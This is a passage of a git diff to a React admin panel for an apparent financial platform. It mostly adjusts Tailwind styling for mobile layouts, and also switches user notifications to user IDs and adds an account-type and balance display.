@@ -12,6 +12,7 @@ import {
   Trash2,
   Search,
   Shield,
+  User,
   UserCheck,
   RefreshCw,
   Ban,
@@ -22,6 +23,7 @@ import {
   Phone,
   MapPin,
   Activity,
+  AlertTriangle,
   MessageSquare,
   Clock,
   ShieldCheck,
@@ -34,7 +36,8 @@ import {
   FileText,
   Globe,
   ArrowLeftRight,
-  FileSearch
+  FileSearch,
+  ArrowRight
 } from 'lucide-react';
 import { useAuth } from '@/contexts/AuthContext';
 import { showSuccess, showError } from '@/utils/toast';
@@ -112,6 +115,7 @@ interface AdminUser {
     rejectionReason?: string;
     submittedAt?: string;
   };
+  accountType?: string;
 }
 
 type AdminUserWithInvestments = AdminUser & { investments?: Array<{ status?: string }> };
@@ -984,16 +988,17 @@ const AdminSection = () => {
     setShowUserDetailModal(true);
   };
 
-  const sendUserNotification = async (userReferralCode: string, message: string) => {
+  const sendUserNotification = async (userId: string, message: string) => {
     if (!message.trim()) return;
 
     setIsSendingMessage(true);
 
     try {
       const notificationData = {
+        title: 'SECURE ADMINISTRATIVE BRIEFING',
         message,
         type: 'individual',
-        recipients: [userReferralCode], // Using referral code instead of userId
+        recipients: [userId], // Using userId instead of referral code for MongoDB compatibility
         sentBy: user?._id
       };
 
@@ -1094,14 +1099,14 @@ const AdminSection = () => {
   return (
     <div className="space-y-6">
       {/* Admin Header */}
-      <div className="bg-[#0b1626] border border-navy-800 text-white rounded-2xl p-8 relative overflow-hidden shadow-2xl shadow-navy-900/50">
+      <div className="bg-[#0b1626] border border-navy-800 text-white rounded-2xl p-6 mobile:p-8 relative overflow-hidden shadow-2xl shadow-navy-900/50">
         <div className="absolute top-0 right-0 w-64 h-64 bg-gold-500/10 rounded-full -mr-32 -mt-32 blur-3xl"></div>
         <div className="relative z-10 flex items-center justify-between">
           <div>
-            <h2 className="text-3xl font-black tracking-tighter uppercase mb-1">Admin Panel</h2>
-            <p className="text-gold-500/80 font-medium">Platform Management & Command Center</p>
+            <h2 className="text-2xl mobile:text-3xl font-black tracking-tighter uppercase mb-1">Admin Panel</h2>
+            <p className="text-gold-500/80 font-medium text-xs mobile:text-base">Platform Management & Command Center</p>
           </div>
-          <ShieldCheck className="w-16 h-16 text-gold-500/20" />
+          <ShieldCheck className="w-12 h-12 mobile:w-16 mobile:h-16 text-gold-500/20" />
         </div>
       </div>
 
@@ -1116,28 +1121,28 @@ const AdminSection = () => {
       )}
 
       {/* Admin Tabs */}
-      <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-8">
-        <div className="flex flex-wrap gap-3 mb-10">
+      <div className="bg-white rounded-2xl mobile:rounded-3xl border border-gray-100 shadow-sm p-4 mobile:p-8">
+        <div className="flex flex-nowrap lg:flex-wrap gap-2 mobile:gap-3 mb-6 mobile:mb-10 overflow-x-auto pb-4 lg:pb-0 scrollbar-hide">
           {[
-            { id: 'users', label: 'Users', icon: <Users className="w-5 h-5" /> },
-            { id: 'kyc-requests', label: 'KYC Requests', icon: <UserCheck className="w-5 h-5" /> },
-            { id: 'card-requests', label: 'Card Requests', icon: <CreditCard className="w-5 h-5" /> },
-            { id: 'loan-requests', label: 'Loan Requests', icon: <Briefcase className="w-5 h-5" /> },
-            { id: 'tax-refunds', label: 'Tax Refunds', icon: <FileText className="w-5 h-5" /> },
-            { id: 'payments', label: 'Payment Methods', icon: <CreditCard className="w-5 h-5" /> },
-            { id: 'transactions', label: 'Transactions', icon: <DollarSign className="w-5 h-5" /> },
-            { id: 'card-topups', label: 'Card Top-ups', icon: <ArrowLeftRight className="w-5 h-5" /> },
-            { id: 'testimonials', label: 'Testimonials', icon: <MessageSquare className="w-5 h-5" /> },
-            { id: 'newsletter', label: 'Newsletter', icon: <Mail className="w-5 h-5" /> },
-            { id: 'support', label: 'Support Messages', icon: <MessageSquare className="w-5 h-5" /> },
-            { id: 'recovery-ops', label: 'Recovery Operations', icon: <FileSearch className="w-5 h-5" /> },
-            { id: 'withdrawal-schedule', label: 'Withdrawal Schedule', icon: <Clock className="w-5 h-5" /> }
+            { id: 'users', label: 'Users', icon: <Users className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'kyc-requests', label: 'KYC', icon: <UserCheck className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'card-requests', label: 'Cards', icon: <CreditCard className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'loan-requests', label: 'Loans', icon: <Briefcase className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'tax-refunds', label: 'Tax', icon: <FileText className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'payments', label: 'Payments', icon: <CreditCard className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'transactions', label: 'Ledger', icon: <DollarSign className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'card-topups', label: 'Top-ups', icon: <ArrowLeftRight className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'testimonials', label: 'Feedback', icon: <MessageSquare className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'newsletter', label: 'Mail', icon: <Mail className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'support', label: 'Support', icon: <MessageSquare className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'recovery-ops', label: 'Recovery', icon: <FileSearch className="w-4 h-4 mobile:w-5 mobile:h-5" /> },
+            { id: 'withdrawal-schedule', label: 'Schedules', icon: <Clock className="w-4 h-4 mobile:w-5 mobile:h-5" /> }
           ].map(tab => (
             <button
               key={tab.id}
               onClick={() => setActiveTab(tab.id as any)}
-              className={`flex items-center space-x-3 px-6 py-3.5 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all duration-300 group ${activeTab === tab.id
-                ? 'bg-navy-900 text-gold-500 shadow-xl shadow-navy-900/10 scale-105'
+              className={`flex items-center space-x-2 mobile:space-x-3 px-4 py-2.5 mobile:px-6 mobile:py-3.5 rounded-xl mobile:rounded-2xl font-black uppercase tracking-widest text-[9px] mobile:text-[11px] transition-all duration-300 group shrink-0 ${activeTab === tab.id
+                ? 'bg-navy-900 text-gold-500 shadow-lg shadow-navy-900/10 scale-105'
                 : 'bg-gray-50 text-gray-400 hover:bg-gray-100'
                 }`}
             >
@@ -1157,7 +1162,7 @@ const AdminSection = () => {
                 <h3 className="text-xl font-black text-navy-900 uppercase tracking-tighter">Virtual Card Bureau</h3>
                 <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Pending Issuance Requests</p>
               </div>
-              <button 
+              <button
                 onClick={loadCardRequests}
                 className="p-3 bg-gray-50 text-gray-400 hover:text-navy-900 rounded-xl transition-all"
                 title="Refresh Records"
@@ -1174,22 +1179,22 @@ const AdminSection = () => {
             ) : cardRequests.length > 0 ? (
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                 {cardRequests.map((request: any) => (
-                  <div key={request._id} className="bg-white p-6 rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl hover:shadow-navy-900/5 transition-all duration-500 group">
-                    <div className="flex items-center justify-between mb-6">
-                      <div className="flex items-center gap-4">
-                        <div className="w-12 h-12 bg-navy-900 rounded-2xl flex items-center justify-center text-gold-500 font-black shadow-lg shadow-navy-900/10">
+                  <div key={request._id} className="bg-white p-5 mobile:p-6 rounded-2xl mobile:rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl hover:shadow-navy-900/5 transition-all duration-500 group">
+                    <div className="flex items-center justify-between mb-4 mobile:mb-6">
+                      <div className="flex items-center gap-3 mobile:gap-4">
+                        <div className="w-10 h-10 mobile:w-12 mobile:h-12 bg-navy-900 rounded-xl mobile:rounded-2xl flex items-center justify-center text-gold-500 font-black shadow-lg shadow-navy-900/10 text-xs mobile:text-base">
                           {request.user?.firstName?.charAt(0)}{request.user?.lastName?.charAt(0)}
                         </div>
                         <div>
-                          <p className="text-[11px] font-black uppercase tracking-tight text-navy-900 truncate max-w-[120px]">
+                          <p className="text-[10px] mobile:text-[11px] font-black uppercase tracking-tight text-navy-900">
                             {request.user?.firstName} {request.user?.lastName}
                           </p>
-                          <p className="text-[9px] font-black text-gold-600 uppercase tracking-widest">{request.user?.userCode}</p>
+                          <p className="text-[8px] mobile:text-[9px] font-black text-gold-600 uppercase tracking-widest">{request.user?.userCode}</p>
                         </div>
                       </div>
                       <div className="text-right">
-                        <p className="text-[9px] font-black text-gray-300 uppercase tracking-widest mb-1">Fee Paid</p>
-                        <p className="text-sm font-black text-navy-900">${request.fee}</p>
+                        <p className="text-[8px] mobile:text-[9px] font-black text-gray-300 uppercase tracking-widest mb-0.5 mobile:mb-1">Fee Paid</p>
+                        <p className="text-xs mobile:text-sm font-black text-navy-900">${request.fee}</p>
                       </div>
                     </div>
 
@@ -1240,7 +1245,7 @@ const AdminSection = () => {
                 <h3 className="text-xl font-black text-navy-900 uppercase tracking-tighter">Loan Underwriting Bureau</h3>
                 <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">Pending Credit Applications</p>
               </div>
-              <button 
+              <button
                 onClick={loadLoanRequests}
                 className="p-3 bg-gray-50 text-gray-400 hover:text-navy-900 rounded-xl transition-all"
               >
@@ -1256,15 +1261,15 @@ const AdminSection = () => {
             ) : loanRequests.length > 0 ? (
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                 {loanRequests.map((loan) => (
-                  <div key={loan._id} className="bg-white p-6 rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl transition-all group">
-                    <div className="flex items-center justify-between mb-6">
-                      <div className="flex items-center gap-4">
-                        <div className="w-12 h-12 bg-navy-900 rounded-2xl flex items-center justify-center text-gold-500 font-black">
+                  <div key={loan._id} className="bg-white p-5 mobile:p-6 rounded-2xl mobile:rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl transition-all group">
+                    <div className="flex items-center justify-between mb-4 mobile:mb-6">
+                      <div className="flex items-center gap-3 mobile:gap-4">
+                        <div className="w-10 h-10 mobile:w-12 mobile:h-12 bg-navy-900 rounded-xl mobile:rounded-2xl flex items-center justify-center text-gold-500 font-black text-xs mobile:text-base">
                           {loan.userDetails?.firstName?.[0]}{loan.userDetails?.lastName?.[0]}
                         </div>
                         <div>
-                          <p className="text-[11px] font-black uppercase text-navy-900">{loan.userDetails?.firstName} {loan.userDetails?.lastName}</p>
-                          <p className="text-[9px] font-black text-gold-600 uppercase tracking-widest">{loan.userDetails?.userCode}</p>
+                          <p className="text-[10px] mobile:text-[11px] font-black uppercase text-navy-900">{loan.userDetails?.firstName} {loan.userDetails?.lastName}</p>
+                          <p className="text-[8px] mobile:text-[9px] font-black text-gold-600 uppercase tracking-widest">{loan.userDetails?.userCode}</p>
                         </div>
                       </div>
                     </div>
@@ -1279,16 +1284,15 @@ const AdminSection = () => {
                       </div>
                       <div className="flex justify-between items-center">
                         <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Status</span>
-                        <span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest ${
-                          loan.status === 'pending' ? 'bg-gold-50 text-gold-600 border border-gold-100' :
-                          loan.status === 'approved' ? 'bg-green-50 text-green-500 border border-green-100' :
-                          'bg-red-50 text-red-500 border border-red-100'
-                        }`}>
+                        <span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest ${loan.status === 'pending' ? 'bg-gold-50 text-gold-600 border border-gold-100' :
+                            loan.status === 'approved' ? 'bg-green-50 text-green-500 border border-green-100' :
+                              'bg-red-50 text-red-500 border border-red-100'
+                          }`}>
                           {loan.status}
                         </span>
                       </div>
                     </div>
-                    <button 
+                    <button
                       onClick={() => { setSelectedLoan(loan); setShowLoanModal(true); }}
                       className="w-full bg-navy-900 text-gold-500 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest active:scale-95 transition-all"
                     >
@@ -1314,7 +1318,7 @@ const AdminSection = () => {
                 <h3 className="text-xl font-black text-navy-900 uppercase tracking-tighter">Tax Refund Portal</h3>
                 <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mt-1">IRS Rebate Applications</p>
               </div>
-              <button 
+              <button
                 onClick={loadTaxRefundRequests}
                 className="p-3 bg-gray-50 text-gray-400 hover:text-navy-900 rounded-xl transition-all"
               >
@@ -1330,15 +1334,15 @@ const AdminSection = () => {
             ) : taxRefundRequests.length > 0 ? (
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                 {taxRefundRequests.map((req: any) => (
-                  <div key={req._id} className="bg-white p-6 rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl transition-all group">
-                    <div className="flex items-center justify-between mb-6">
-                      <div className="flex items-center gap-4">
-                        <div className="w-12 h-12 bg-navy-900 rounded-2xl flex items-center justify-center text-gold-500 font-black">
+                  <div key={req._id} className="bg-white p-5 mobile:p-6 rounded-2xl mobile:rounded-[2.5rem] border border-gray-100 shadow-sm hover:shadow-xl transition-all group">
+                    <div className="flex items-center justify-between mb-4 mobile:mb-6">
+                      <div className="flex items-center gap-3 mobile:gap-4">
+                        <div className="w-10 h-10 mobile:w-12 mobile:h-12 bg-navy-900 rounded-xl mobile:rounded-2xl flex items-center justify-center text-gold-500 font-black text-xs mobile:text-base">
                           {req.fullName?.[0]}
                         </div>
                         <div>
-                          <p className="text-[11px] font-black uppercase text-navy-900">{req.fullName}</p>
-                          <p className="text-[9px] font-black text-gold-600 uppercase tracking-widest">{req.country}</p>
+                          <p className="text-[10px] mobile:text-[11px] font-black uppercase text-navy-900">{req.fullName}</p>
+                          <p className="text-[8px] mobile:text-[9px] font-black text-gold-600 uppercase tracking-widest">{req.country}</p>
                         </div>
                       </div>
                     </div>
@@ -1349,16 +1353,15 @@ const AdminSection = () => {
                       </div>
                       <div className="flex justify-between items-center">
                         <span className="text-[9px] font-black text-gray-400 uppercase tracking-widest">Status</span>
-                        <span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest ${
-                          req.status === 'pending' ? 'bg-gold-50 text-gold-600 border border-gold-100' :
-                          req.status === 'processing' ? 'bg-blue-50 text-blue-500 border border-blue-100' :
-                          'bg-green-50 text-green-500 border border-green-100'
-                        }`}>
+                        <span className={`px-3 py-1 rounded-lg text-[8px] font-black uppercase tracking-widest ${req.status === 'pending' ? 'bg-gold-50 text-gold-600 border border-gold-100' :
+                            req.status === 'processing' ? 'bg-blue-50 text-blue-500 border border-blue-100' :
+                              'bg-green-50 text-green-500 border border-green-100'
+                          }`}>
                           {req.status}
                         </span>
                       </div>
                     </div>
-                    <button 
+                    <button
                       onClick={() => { setSelectedTaxRefund(req); setShowTaxRefundModal(true); }}
                       className="w-full bg-navy-900 text-gold-500 py-4 rounded-2xl text-[10px] font-black uppercase tracking-widest active:scale-95 transition-all"
                     >
@@ -1454,17 +1457,17 @@ const AdminSection = () => {
                 {filteredUsers.map(user => (
                   <div
                     key={user._id}
-                    className="bg-white rounded-3xl p-6 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 cursor-pointer group"
+                    className="bg-white rounded-2xl mobile:rounded-3xl p-4 mobile:p-6 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 cursor-pointer group"
                     onClick={() => openUserDetail(user)}
                   >
-                    <div className="flex items-center justify-between mb-6">
-                      <div className="flex items-center space-x-4">
-                        <div className="w-14 h-14 bg-gray-50 rounded-2xl flex items-center justify-center border border-gray-200 group-hover:bg-gold-50 group-hover:border-gold-200 transition-colors">
-                          <Users className="w-7 h-7 text-gray-300 group-hover:text-gold-500" />
+                    <div className="flex items-center justify-between mb-4 mobile:mb-6">
+                      <div className="flex items-center space-x-3 mobile:space-x-4">
+                        <div className="w-10 h-10 mobile:w-14 mobile:h-14 bg-gray-50 rounded-xl mobile:rounded-2xl flex items-center justify-center border border-gray-200 group-hover:bg-gold-50 group-hover:border-gold-200 transition-colors">
+                          <Users className="w-5 h-5 mobile:w-7 mobile:h-7 text-gray-300 group-hover:text-gold-500" />
                         </div>
                         <div>
-                          <div className="font-black text-navy-900 uppercase tracking-tight text-sm">{user.firstName} {user.lastName}</div>
-                          <div className="text-[10px] font-black text-gray-400 uppercase tracking-widest bg-gray-50 px-2 py-0.5 rounded-full border border-gray-100 mt-1">{user.userCode}</div>
+                          <div className="font-black text-navy-900 uppercase tracking-tight text-xs mobile:text-sm">{user.firstName} {user.lastName}</div>
+                          <div className="text-[8px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest bg-gray-50 px-2 py-0.5 rounded-full border border-gray-100 mt-1">{user.userCode}</div>
                         </div>
                       </div>
                       <div className="flex flex-col items-end gap-2">
@@ -1485,18 +1488,22 @@ const AdminSection = () => {
                       </div>
                     </div>
 
-                    <div className="space-y-4 mb-8">
-                      <div className="flex justify-between items-center py-2 border-b border-gray-50">
-                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Email Address</span>
-                        <span className="text-xs font-bold text-navy-900 truncate max-w-[160px]">{user.email}</span>
+                    <div className="space-y-3 mobile:space-y-4 mb-6 mobile:mb-8">
+                      <div className="flex justify-between items-center py-1.5 mobile:py-2 border-b border-gray-50">
+                        <span className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest">Email</span>
+                        <span className="text-[10px] mobile:text-xs font-bold text-navy-900 break-all ml-4 text-right">{user.email}</span>
                       </div>
-                      <div className="flex justify-between items-center py-2 border-b border-gray-50">
-                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Available Balance</span>
-                        <span className="text-sm font-black text-gold-600">${user.totalInvested?.toLocaleString() || '0'}</span>
+                      <div className="flex justify-between items-center py-1.5 mobile:py-2 border-b border-gray-50">
+                        <span className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest">Account Type</span>
+                        <span className="text-[9px] mobile:text-[10px] font-black text-navy-900/60 uppercase tracking-widest">{user.accountType || 'Personal'}</span>
                       </div>
-                      <div className="flex justify-between items-center py-2 border-b border-gray-50">
-                        <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Current Plan</span>
-                        <span className="text-[10px] font-black text-navy-900/40 uppercase tracking-widest">{user.investmentPlan || 'None'}</span>
+                      <div className="flex justify-between items-center py-1.5 mobile:py-2 border-b border-gray-50">
+                        <span className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest">Balance</span>
+                        <span className="text-xs mobile:text-sm font-black text-gold-600">${(user.balances?.total || user.totalInvested || 0).toLocaleString()}</span>
+                      </div>
+                      <div className="flex justify-between items-center py-1.5 mobile:py-2 border-b border-gray-50">
+                        <span className="text-[9px] mobile:text-[10px] font-black text-gray-400 uppercase tracking-widest">Plan</span>
+                        <span className="text-[9px] mobile:text-[10px] font-black text-navy-900/40 uppercase tracking-widest">{user.investmentPlan || 'None'}</span>
                       </div>
                     </div>
 
@@ -1578,15 +1585,15 @@ const AdminSection = () => {
             ) : (
               <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                 {kycRequests.map(user => (
-                  <div key={user._id} className="bg-white rounded-3xl p-8 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 group">
-                    <div className="flex items-center justify-between mb-8">
-                      <div className="flex items-center space-x-4">
-                        <div className="w-12 h-12 bg-navy-50 rounded-2xl flex items-center justify-center font-black text-navy-900 uppercase tracking-tighter">
+                  <div key={user._id} className="bg-white rounded-2xl mobile:rounded-3xl p-6 mobile:p-8 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 group">
+                    <div className="flex items-center justify-between mb-6 mobile:mb-8">
+                      <div className="flex items-center space-x-3 mobile:space-x-4">
+                        <div className="w-10 h-10 mobile:w-12 mobile:h-12 bg-navy-50 rounded-xl mobile:rounded-2xl flex items-center justify-center font-black text-navy-900 uppercase tracking-tighter text-sm mobile:text-base">
                           {user.firstName?.charAt(0)}{user.lastName?.charAt(0)}
                         </div>
                         <div>
-                          <h4 className="font-black text-navy-900 uppercase tracking-tight">{user.firstName} {user.lastName}</h4>
-                          <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">{user.userCode}</p>
+                          <h4 className="font-black text-navy-900 uppercase tracking-tight text-sm mobile:text-base">{user.firstName} {user.lastName}</h4>
+                          <p className="text-[9px] mobile:text-[10px] font-bold text-gray-400 uppercase tracking-widest">{user.userCode}</p>
                         </div>
                       </div>
                     </div>
@@ -1594,7 +1601,7 @@ const AdminSection = () => {
                     <div className="space-y-4 mb-8 bg-gray-50/50 p-6 rounded-2xl border border-gray-100/50">
                       <div className="flex justify-between items-center py-1">
                         <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Email</span>
-                        <span className="text-xs font-bold text-navy-900 truncate max-w-[150px]">{user.email}</span>
+                        <span className="text-xs font-bold text-navy-900">{user.email}</span>
                       </div>
                       <div className="flex justify-between items-center py-1">
                         <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">Country</span>
@@ -1655,19 +1662,19 @@ const AdminSection = () => {
             ) : (
               <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                 {paymentMethods.map(method => (
-                  <div key={method._id} className="bg-white rounded-3xl p-8 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 group">
-                    <div className="flex items-center justify-between mb-8">
-                      <div className="flex items-center space-x-4">
-                        <div className="w-16 h-16 bg-gray-50 rounded-2xl flex items-center justify-center p-3 border border-gray-100 group-hover:bg-white transition-colors">
+                  <div key={method._id} className="bg-white rounded-2xl mobile:rounded-3xl p-6 mobile:p-8 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 group">
+                    <div className="flex items-center justify-between mb-6 mobile:mb-8">
+                      <div className="flex items-center space-x-3 mobile:space-x-4">
+                        <div className="w-12 h-12 mobile:w-16 mobile:h-16 bg-gray-50 rounded-xl mobile:rounded-2xl flex items-center justify-center p-2 mobile:p-3 border border-gray-100 group-hover:bg-white transition-colors">
                           {method.logo ? (
                             <img src={method.logo} alt={method.name} className="w-full h-full object-contain filter grayscale group-hover:grayscale-0 transition-all" />
                           ) : (
-                            <CreditCard className="w-8 h-8 text-gray-300" />
+                            <CreditCard className="w-6 h-6 mobile:w-8 mobile:h-8 text-gray-300" />
                           )}
                         </div>
                         <div>
-                          <h4 className="font-black text-navy-900 uppercase tracking-tight">{method.name}</h4>
-                          <span className={`inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full text-[9px] font-black uppercase tracking-widest mt-1 border ${method.isActive ? 'bg-green-50 text-green-500 border-green-100' : 'bg-red-50 text-red-500 border-red-100'
+                          <h4 className="font-black text-navy-900 uppercase tracking-tight text-sm mobile:text-base">{method.name}</h4>
+                          <span className={`inline-flex items-center gap-1 mobile:gap-1.5 px-2 py-0.5 rounded-full text-[8px] mobile:text-[9px] font-black uppercase tracking-widest mt-1 border ${method.isActive ? 'bg-green-50 text-green-500 border-green-100' : 'bg-red-50 text-red-500 border-red-100'
                             }`}>
                             <div className={`w-1 h-1 rounded-full ${method.isActive ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}></div>
                             {method.isActive ? 'Live' : 'Hidden'}
@@ -1753,40 +1760,40 @@ const AdminSection = () => {
             </div>
 
             {/* Transaction Type Toggle */}
-            <div className="flex items-center justify-center bg-gray-50/50 p-2 rounded-2xl border border-gray-100 max-w-sm mx-auto">
+            <div className="flex items-center justify-center bg-gray-50/50 p-1.5 mobile:p-2 rounded-xl mobile:rounded-2xl border border-gray-100 max-w-sm mx-auto">
               <button
                 onClick={() => setSelectedTransactionType('deposits')}
-                className={`flex-1 flex flex-col items-center justify-center py-4 rounded-xl transition-all duration-300 ${selectedTransactionType === 'deposits'
+                className={`flex-1 flex flex-col items-center justify-center py-3 mobile:py-4 rounded-lg mobile:rounded-xl transition-all duration-300 ${selectedTransactionType === 'deposits'
                   ? 'bg-navy-900 text-gold-500 shadow-xl'
                   : 'text-gray-400 hover:text-navy-900'
                   }`}
               >
-                <span className="text-[10px] font-black uppercase tracking-widest mb-1">Incoming</span>
-                <span className="text-lg font-black tracking-tighter">${getFilteredDeposits().reduce((acc, curr) => acc + (curr.amount || 0), 0).toLocaleString()}</span>
-                <span className="text-[8px] font-bold opacity-40 uppercase">{getFilteredDeposits().length} Entries</span>
+                <span className="text-[8px] mobile:text-[10px] font-black uppercase tracking-widest mb-1">Incoming</span>
+                <span className="text-base mobile:text-lg font-black tracking-tighter">${getFilteredDeposits().reduce((acc, curr) => acc + (curr.amount || 0), 0).toLocaleString()}</span>
+                <span className="text-[7px] mobile:text-[8px] font-bold opacity-40 uppercase">{getFilteredDeposits().length} Entries</span>
               </button>
-              <div className="w-px h-10 bg-gray-200"></div>
+              <div className="w-px h-8 mobile:h-10 bg-gray-200 mx-1"></div>
               <button
                 onClick={() => setSelectedTransactionType('withdrawals')}
-                className={`flex-1 flex flex-col items-center justify-center py-4 rounded-xl transition-all duration-300 ${selectedTransactionType === 'withdrawals'
+                className={`flex-1 flex flex-col items-center justify-center py-3 mobile:py-4 rounded-lg mobile:rounded-xl transition-all duration-300 ${selectedTransactionType === 'withdrawals'
                   ? 'bg-navy-900 text-gold-500 shadow-xl'
                   : 'text-gray-400 hover:text-navy-900'
                   }`}
               >
-                <span className="text-[10px] font-black uppercase tracking-widest mb-1">Outgoing</span>
-                <span className="text-lg font-black tracking-tighter">${getFilteredWithdrawals().reduce((acc, curr) => acc + (curr.amount || 0), 0).toLocaleString()}</span>
-                <span className="text-[8px] font-bold opacity-40 uppercase">{getFilteredWithdrawals().length} Entries</span>
+                <span className="text-[8px] mobile:text-[10px] font-black uppercase tracking-widest mb-1">Outgoing</span>
+                <span className="text-base mobile:text-lg font-black tracking-tighter">${getFilteredWithdrawals().reduce((acc, curr) => acc + (curr.amount || 0), 0).toLocaleString()}</span>
+                <span className="text-[7px] mobile:text-[8px] font-bold opacity-40 uppercase">{getFilteredWithdrawals().length} Entries</span>
               </button>
             </div>
 
             {/* Filter Options */}
-            <div className="flex items-center justify-center gap-3">
+            <div className="flex items-center justify-center gap-2 mobile:gap-3 flex-wrap">
               {selectedTransactionType === 'deposits' ? (
                 (['all', 'pending', 'approved', 'rejected'] as const).map((filter) => (
                   <button
                     key={filter}
                     onClick={() => setDepositFilter(filter)}
-                    className={`px-5 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${depositFilter === filter
+                    className={`px-3 py-2 mobile:px-5 mobile:py-2.5 rounded-lg mobile:rounded-xl text-[8px] mobile:text-[10px] font-black uppercase tracking-widest transition-all ${depositFilter === filter
                       ? 'bg-gold-50 text-gold-600 border border-gold-200 shadow-sm'
                       : 'bg-white text-gray-400 border border-gray-100 hover:border-gray-200'
                       }`}
@@ -1799,7 +1806,7 @@ const AdminSection = () => {
                   <button
                     key={filter}
                     onClick={() => setWithdrawalFilter(filter)}
-                    className={`px-5 py-2.5 rounded-xl text-[10px] font-black uppercase tracking-widest transition-all ${withdrawalFilter === filter
+                    className={`px-3 py-2 mobile:px-5 mobile:py-2.5 rounded-lg mobile:rounded-xl text-[8px] mobile:text-[10px] font-black uppercase tracking-widest transition-all ${withdrawalFilter === filter
                       ? 'bg-gold-50 text-gold-600 border border-gold-200 shadow-sm'
                       : 'bg-white text-gray-400 border border-gray-100 hover:border-gray-200'
                       }`}
@@ -1816,20 +1823,20 @@ const AdminSection = () => {
                 getFilteredDeposits().map((deposit) => (
                   <div
                     key={deposit._id}
-                    className="bg-white rounded-3xl p-6 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 cursor-pointer group"
+                    className="bg-white rounded-2xl mobile:rounded-3xl p-5 mobile:p-6 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 cursor-pointer group"
                     onClick={() => {
                       setSelectedTransaction(deposit);
                       setShowTransactionModal(true);
                     }}
                   >
-                    <div className="flex items-center justify-between mb-6">
-                      <div className="flex items-center space-x-3">
-                        <div className="p-2.5 bg-gold-50 text-gold-500 rounded-xl group-hover:bg-navy-900 transition-colors">
-                          <Download className="w-4 h-4" />
+                    <div className="flex items-center justify-between mb-4 mobile:mb-6">
+                      <div className="flex items-center space-x-2 mobile:space-x-3">
+                        <div className="p-2 mobile:p-2.5 bg-gold-50 text-gold-500 rounded-lg mobile:rounded-xl group-hover:bg-navy-900 transition-colors">
+                          <Download className="w-3.5 h-3.5 mobile:w-4 mobile:h-4" />
                         </div>
-                        <span className="text-[10px] font-black text-navy-900 uppercase tracking-widest">Inbound Deposit</span>
+                        <span className="text-[9px] mobile:text-[10px] font-black text-navy-900 uppercase tracking-widest">Inbound Deposit</span>
                       </div>
-                      <span className={`px-4 py-1.5 text-[9px] font-black uppercase tracking-widest rounded-full border transition-all ${deposit.status === 'approved' ? 'bg-green-50 text-green-500 border-green-100' :
+                      <span className={`px-3 mobile:px-4 py-1 mobile:py-1.5 text-[8px] mobile:text-[9px] font-black uppercase tracking-widest rounded-full border transition-all ${deposit.status === 'approved' ? 'bg-green-50 text-green-500 border-green-100' :
                         deposit.status === 'rejected' ? 'bg-red-50 text-red-500 border-red-100' :
                           'bg-gold-50 text-gold-600 border-gold-100 animate-pulse'
                         }`}>
@@ -1865,20 +1872,20 @@ const AdminSection = () => {
                 getFilteredWithdrawals().map((withdrawal) => (
                   <div
                     key={withdrawal._id}
-                    className="bg-white rounded-3xl p-6 border border-gray-100 shadow-sm hover:shadow-xl hover:border-gold-500/30 transition-all duration-500 cursor-pointer group"
